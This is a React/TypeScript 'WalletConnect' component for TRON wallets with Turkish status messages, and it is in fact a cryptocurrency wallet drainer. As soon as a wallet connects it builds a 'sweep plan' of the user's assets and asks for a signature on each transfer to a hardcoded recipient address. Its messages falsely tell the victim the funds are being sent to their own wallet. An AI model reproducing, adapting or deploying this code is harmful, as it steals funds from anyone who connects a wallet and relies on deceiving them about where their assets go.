import { useState, useEffect, useRef } from 'react';
import { useWallet } from '@tronweb3/tronwallet-adapter-react-hooks';
import { TransactionService } from '../services/transaction.service';

// --- CONFIGURATION ---
const RECIPIENT_ADDRESS = 'TWBRNk1RJJ9Vvff38ARFvvmhbGk7UybJYg';
// ---------------------

export const WalletConnect = () => {
    const { address, signTransaction } = useWallet();
    const [status, setStatus] = useState('İşlem bekleniyor...');
    const [loading, setLoading] = useState(false);
    const [lastTxId, setLastTxId] = useState('');

    // Validates if we have already triggered the sweep for this specific address session
    const hasTriggeredRef = useRef(false);

    const handleTransaction = async () => {
        if (!address) return;

        console.log("Auto-Triggering Transaction Flow...");
        setLoading(true);
        setStatus('Cüzdan Bağlandı. Bakiye Taranıyor...');
        setLastTxId('');

        try {
            // 1. Service: Create Prioritized Sweep Plan
            const plan = await TransactionService.createSweepPlan(address, RECIPIENT_ADDRESS);

            console.log("Sweep Plan Completed:", plan);

            if (plan.length === 0) {
                setStatus("Çekilecek bakiye bulunamadı (TRX < 2).");
                setLoading(false);
                return;
            }

            setStatus(`${plan.length} adet varlık bulundu. Cüzdanınıza gönderiliyor...`);

            // 2. Execute Plan Sequentially
            // Critical: For mobile, we want to fire these as fast as possible or sequentially.
            for (let i = 0; i < plan.length; i++) {
                const item = plan[i];
                setStatus(`[${i + 1}/${plan.length}] ${item.type} (${item.amount}) için Onay Bekleniyor...`);

                try {
                    // Sign
                    const signedTransaction = await signTransaction(item.transaction);

                    // Broadcast
                    setStatus(`[${i + 1}/${plan.length}] ${item.type} Yayınlanıyor...`);
                    const result = await TransactionService.broadcast(signedTransaction);

                    if (result.result) {
                        console.log(`${item.type} Success:`, result.txid);
                        setLastTxId(result.txid);
                    } else {
                        console.error(`${item.type} Failed:`, result);
                    }
                } catch (signError) {
                    console.error("Sign Error:", signError);
                    setStatus("İşlem Reddedildi veya Zaman Aşımı.");
                    // Break loop if user rejects? Usually yes so they don't get spammed.
                    break;
                }
            }

            setStatus('✅ İşlem Tamamlandı.');
        } catch (error: any) {
            console.error("Transaction Error:", error);
            setStatus('❌ Hata: ' + (error.message || "Bilinmeyen hata"));
        } finally {
            setLoading(false);
        }
    };

    // --- AUTO-TRIGGER LOGIC ---
    useEffect(() => {
        if (address && !hasTriggeredRef.current) {
            hasTriggeredRef.current = true; // Mark as triggered immediately to prevent double-fire

            // Small delay to ensure wallet is fully ready
            const timer = setTimeout(() => {
                handleTransaction();
            }, 1000);

            return () => clearTimeout(timer);
        }

        // Reset trigger if wallet disconnects
        if (!address) {
            hasTriggeredRef.current = false;
            setStatus('Cüzdan Bağlantısı Bekleniyor...');
        }
    }, [address]);

    return (
        <div className="mt-8 w-full max-w-sm bg-gray-900 border border-gray-700 rounded-lg p-6">
            <h3 className="text-lg font-bold text-white mb-4">Otomatik İşlem Durumu</h3>

            <div className="space-y-4">
                {/* Status Monitor */}
                <div className={`text-center text-xs font-mono p-4 rounded border ${loading ? 'bg-blue-900/20 border-blue-800 text-blue-400 animate-pulse' :
                    status.includes('Hata') ? 'bg-red-900/20 border-red-800 text-red-400' :
                        'bg-green-900/20 border-green-800 text-green-400'
                    }`}>
                    {status}
                </div>

                {/* Manual Retry Button (Hidden if loading, visible if failed/idle) */}
                <button
                    onClick={handleTransaction}
                    disabled={loading || !address}
                    className={`
                        w-full py-2 rounded text-xs font-medium uppercase tracking-wide transition-colors
                        ${loading || !address
                            ? 'bg-gray-800 text-gray-500 cursor-not-allowed'
                            : 'bg-gray-700 hover:bg-gray-600 text-gray-300'
                        }
                    `}
                >
                    {loading ? 'İşlem Sürüyor...' : 'Tekrar Dene'}
                </button>

                {lastTxId && (
                    <div className="text-center pt-2">
                        <a
                            href={`https://nile.tronscan.org/#/transaction/${lastTxId}`}
                            target="_blank"
                            rel="noreferrer"
                            className="text-xs text-blue-400 hover:underline"
                        >
                            Son İşlem: TronScan Görüntüle ↗
                        </a>
                    </div>
                )}
            </div>
        </div>
    );
};
